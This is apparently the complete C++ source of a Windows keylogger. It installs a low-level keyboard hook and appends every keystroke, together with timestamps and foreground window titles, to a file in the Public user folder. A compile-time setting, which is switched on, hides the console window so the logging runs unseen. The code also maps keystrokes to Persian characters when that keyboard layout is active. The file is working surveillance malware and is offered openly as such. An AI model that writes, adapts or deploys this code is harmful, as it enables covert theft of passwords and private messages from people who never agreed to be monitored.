// Include necessary libraries
#define UNICODE

#include <map>
#include <ctime>
#include <mutex>
#include <locale>
#include <cstring>
#include <fstream>
#include <sstream>
#include <codecvt>
#include <iomanip>
#include <iostream>
#include <Windows.h>

// Custom string buffer class inheriting from std::stringbuf
class MBuf : public std::stringbuf {
public:
    // Override sync method to output the content to stdout
    int sync() override {
        fputs(str().c_str(), stdout);
        str("");
        return 0;
    }
};

// Define whether the window is visible or not (should be solved with makefile, not in this file)
#define invisible // (visible / invisible)

// Define which format to use for logging (0 for default, 10 for dec codes, 16 for hex codes)
#define FORMAT 0

// defines if ignore mouse clicks
#define mouse_ignore

// Variable to store the HANDLE to the hook. Declare it globally.
#if FORMAT == 0

// Map of virtual key codes to corresponding strings
const std::map<int, std::string> key_name{
        {VK_LBUTTON,          "[LeftMouseBUTTON]"},
        {VK_RBUTTON,          "[RightMouseBUTTON]"},
        {VK_MBUTTON,          "[MiddleMouseBUTTON]"},
        {VK_XBUTTON1,         "[X1MouseBUTTON]"},
        {VK_XBUTTON2,         "[X2MouseBUTTON]"},
        {VK_BACK,             "[BACKSPACE]"},
        {VK_TAB,              "[TAB]"},
        {VK_CLEAR,            "[CLEAR]"},
        {VK_RETURN,           "[ENTER]"},
        {VK_SHIFT,            "[SHIFT]"},
        {VK_CONTROL,          "[CONTROL]"},
        {VK_MENU,             "[ALT]"},
        {VK_PAUSE,            "[PAUSE]"},
        {VK_CAPITAL,          "[CAPSLOCK]"},
        {VK_ESCAPE,           "[ESCAPE]"},
        {VK_SPACE,            " "},
        {VK_PRIOR,            "[PG_UP]"},
        {VK_NEXT,             "[PG_DOWN]"},
        {VK_END,              "[END]"},
        {VK_HOME,             "[HOME]"},
        {VK_LEFT,             "[LEFT]"},
        {VK_UP,               "[UP]"},
        {VK_RIGHT,            "[RIGHT]"},
        {VK_DOWN,             "[DOWN]"},
        {VK_SELECT,           "[SELECT]"},
        {VK_PRINT,            "[PRINT]"},
        {VK_EXECUTE,          "[EXECUTE]"},
        {VK_SNAPSHOT,         "[SNAPSHOT]"},
        {VK_INSERT,           "[INSERT]"},
        {VK_DELETE,           "[DELETE]"},
        {VK_HELP,             "[HELP]"},
        {VK_LWIN,             "[LeftWIN]"},
        {VK_RWIN,             "[RightWIN]"},
        {VK_APPS,             "[APPs]"},
        {VK_SLEEP,            "[SLEEP]"},
        {VK_F1,               "[F1]"},
        {VK_F2,               "[F2]"},
        {VK_F3,               "[F3]"},
        {VK_F4,               "[F4]"},
        {VK_F5,               "[F5]"},
        {VK_F6,               "[F6]"},
        {VK_F7,               "[F7]"},
        {VK_F8,               "[F8]"},
        {VK_F9,               "[F9]"},
        {VK_F10,              "[F10]"},
        {VK_F11,              "[F11]"},
        {VK_F12,              "[F12]"},
        {VK_NUMLOCK,          "[NUMLOCK]"},
        {VK_SCROLL,           "[SCROLL]"},
        {VK_LSHIFT,           "[LeftSHIFT]"},
        {VK_RSHIFT,           "[RightSHIFT]"},
        {VK_LCONTROL,         "[LeftCONTROL]"},
        {VK_RCONTROL,         "[RightCONTROL]"},
        {VK_LMENU,            "[LeftALT]"},
        {VK_RMENU,            "[RightALT]"},
        {VK_VOLUME_MUTE,      "[VOLUME_MUTE]"},
        {VK_VOLUME_DOWN,      "[VOLUME_DOWN]"},
        {VK_VOLUME_UP,        "[VOLUME_UP]"},
        {VK_MEDIA_NEXT_TRACK, "[MEDIA_NEXT_TRACK]"},
        {VK_MEDIA_PREV_TRACK, "[MEDIA_PREV_TRACK]"},
        {VK_MEDIA_STOP,       "[MEDIA_STOP]"},
        {VK_MEDIA_PLAY_PAUSE, "[MEDIA_PLAY_PAUSE]"},
        {VK_PLAY,             "[PLAY]"},
        {VK_ZOOM,             "[ZOOM]"},
        {VK_OEM_PERIOD,       "."},
        {VK_DECIMAL,          "."},
        {VK_OEM_PLUS,         "+"},
        {VK_OEM_MINUS,        "-"},
        {VK_ADD,              "+"},
        {VK_SUBTRACT,         "-"},
};

// Map of English characters to Persian characters
const std::map<std::string, std::string> eng_to_per{
        {"Q",  "ض"},
        {"W",  "ص"},
        {"E",  "ث"},
        {"R",  "ق"},
        {"T",  "ف"},
        {"Y",  "غ"},
        {"U",  "ع"},
        {"I",  "ه"},
        {"O",  "خ"},
        {"P",  "ح"},
        {"[",  "ج"},
        {"�",  "ج"},
        {"]",  "چ"},
        {"\\", "پ"},
        {"A",  "ش"},
        {"S",  "س"},
        {"D",  "ی"},
        {"F",  "ب"},
        {"G",  "ل"},
        {"H",  "ا"},
        {"J",  "ت"},
        {"K",  "ن"},
        {"L",  "م"},
        {";",  "ک"},
        {"'",  "گ"},
        {"Z",  "ظ"},
        {"X",  "ط"},
        {"C",  "ز"},
        {"V",  "ر"},
        {"B",  "ذ"},
        {"N",  "د"},
        {"M",  "ئ"},
        {",",  "و"},
};

// Map of special English characters to Persian characters
const std::map<std::string, std::string> special_eng_to_per{
        {"129", "پ"},
        {"141", "چ"},
        {"204", "ج"},
        {"144", "گ"},
        {"152", "ک"},
        {"230", "و"},
};
#endif

// Hook handle variable
HHOOK _hook;

// Struct to hold data received by the hook callback
KBDLLHOOKSTRUCT kbd_struct;

// Keep the last foreground window title
std::string last_window;

// Output file stream
std::ofstream output_file;

// Function to convert a string to lowercase
std::string toLowerCase(const std::string &str);

// Hook callback function
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

// Set the keyboard hook
void setHook();

// Release the keyboard hook
void releaseHook();

// Get the current time as a string
std::string getCurrentTimeAsString();

// Get the current keyboard layout language identifier
int getCurrentKeyboardLayout();

// Save the pressed key to the output file
int save(int key_stroke);

// Function to hide or show the console window
void stealth();

// Main function
int main() {
    // Set console output to UTF-8
    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, nullptr, _IONBF, 0);

    // Create a UTF-8 locale
    std::locale utf8_locale(std::locale(), new std::codecvt_utf8<wchar_t>);

    // Set the locale for cout
    std::wcout.imbue(utf8_locale);

    // Create a custom string buffer and redirect cout to it
    MBuf buf;
    std::cout.rdbuf(&buf);

    // open output file in append mode
    const char *output_filename = R"(C:\Users\Public\KYLGGR.out)";
    std::cout << "Logging output to " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    // Set the console window visibility
    stealth();

    // Set the keyboard hook
    setHook();

    // Loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
    }
}

// Function to convert a string to lowercase
std::string toLowerCase(const std::string &str) {
    std::string result;
    for (char ch: str) {
        result += std::tolower(ch);
    }
    return result;
}

// Hook callback function
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN) {
            // Get the keyboard hook data
            kbd_struct = *((KBDLLHOOKSTRUCT *) lParam);

            // Save the key to the output file
            save(kbd_struct.vkCode);
        }
    }

    // Call the next hook in the hook chain
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// Set the keyboard hook
void setHook() {
// Set the hook and set it to use the callback function above
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0))) {
        // Display an error message if hook installation fails
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(nullptr, a, b, MB_ICONERROR);
    }
}

// Release the keyboard hook
void releaseHook() {
    UnhookWindowsHookEx(_hook);
}

// Get the current time as a string
std::string getCurrentTimeAsString() {
    // Get the current time
    std::time_t currentTime = std::time(nullptr);

    // Convert the time to a string
    std::tm *localTime = std::localtime(&currentTime);
    std::stringstream ss;
    ss << std::put_time(localTime, "%Y-%m-%d %H:%M:%S");

    return ss.str();
}

// Get the current keyboard layout language identifier
int getCurrentKeyboardLayout() {
    // Get the active window handle
    HWND foreground = GetForegroundWindow();

    // Get the thread identifier of the foreground window
    DWORD threadID = GetWindowThreadProcessId(foreground, nullptr);

    // Get the keyboard layout of the thread
    HKL layout = GetKeyboardLayout(threadID);

    // Get the keyboard layout language identifier
    LANGID languageId = LOWORD(layout);

    return languageId;
}

// Save the pressed key to the output file
int save(int key_stroke) {
    std::stringstream output;

#ifndef mouse_ignore
    // Ignore mouse clicks
    if ((key_stroke == 1) || (key_stroke == 2)) {
        return 0; // ignore mouse clicks
    }
#endif

    // Get the active window handle and keyboard layout
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = nullptr;

    if (foreground) {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, nullptr);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        // Get the window title
        wchar_t window_title[256];
        GetWindowTextW(foreground, window_title, 256);

        // Convert wide character string to UTF-8 narrow character string
        std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
        std::string utf8_title = converter.to_bytes(window_title);

        // Check if the window title has changed
        if (utf8_title != last_window) {
            last_window = utf8_title;

            // Log the window title and current time
            output << "\n\n[" << getCurrentTimeAsString() << "] (" << utf8_title << ")\n";
        }
    }

// Choose the format based on the specified FORMAT value
#if FORMAT == 10
    output << '[' << key_stroke << ']';

#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';

#else
    // Log the key based on the key_name map and keyboard layout
    if (key_name.find(key_stroke) != key_name.end())
        output << key_name.at(key_stroke);

    else {
        std::string key, key_str;

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        key_str = std::to_string(MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout));

        if (getCurrentKeyboardLayout() == 1065) { // Persian characters
            if (eng_to_per.find(key) != eng_to_per.end())
                output << eng_to_per.at(key);
            else if (special_eng_to_per.find(key_str) != special_eng_to_per.end())
                output << special_eng_to_per.at(key_str);
            else
                output << key;

        } else { // English characters
            // Check caps lock
            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

            // Check shift key
            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
                || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
                lowercase = !lowercase;

            // Convert to lowercase if needed
            if (!lowercase)
                key = toLowerCase(key);

            // Log the key
            output << key;
        }
    }
#endif
    // Instead of opening and closing file handlers every time, keep the file open and flush.
    output_file << output.str();
    output_file.flush();

    // Print the output to the console
    std::cout << output.str() << std::flush;

    return 0;
}

// Function to hide or show the console window
void stealth() {
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 0); // invisible window
#endif
}